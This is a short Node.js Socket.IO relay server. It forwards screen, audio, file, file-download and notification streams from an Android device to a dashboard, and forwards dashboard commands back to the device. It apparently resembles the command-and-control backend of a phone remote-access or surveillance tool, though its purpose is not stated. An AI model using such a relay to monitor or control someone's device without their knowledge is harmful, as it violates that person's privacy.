const express = require('express');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);

// 1. CONFIGURATION
const PORT = process.env.PORT || 3000;
const RENDER_URL = process.env.RENDER_EXTERNAL_URL; 

// 2. WEB HOSTING (Serves your dashboard)
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 3. SOCKET.IO SETUP
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 2e7 // 20MB for screen frames and files
});

// 4. DATA RELAY LOGIC
io.on('connection', (socket) => {
    console.log(`Connected: ${socket.id}`);

    // Relay Screen, Audio, and File data from Android to Dashboard
    socket.on('data-stream', (data) => socket.broadcast.emit('data-stream', data));
    socket.on('audio-stream', (data) => socket.broadcast.emit('audio-stream', data));
    socket.on('file-list', (data) => socket.broadcast.emit('file-list', data));
    socket.on('file-download-ready', (data) => socket.broadcast.emit('file-download-ready', data));
    socket.on('notif-data', (data) => socket.broadcast.emit('notif-data', data));

    // Relay Commands from Dashboard to Android
    socket.on('command', (cmd) => {
        console.log(`Command: ${cmd}`);
        socket.broadcast.emit('command', cmd);
    });

    socket.on('disconnect', () => console.log(`Left: ${socket.id}`));
});

// 5. START SERVER
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server listening on port ${PORT}`);
    
    // Self-ping to prevent sleep on Render Free Tier
    if (RENDER_URL) {
        setInterval(() => {
            https.get(RENDER_URL, (res) => {
                console.log(`Self-Ping: ${res.statusCode}`);
            }).on('error', (e) => console.log("Ping error"));
        }, 600000); // 10 minutes
    }
});
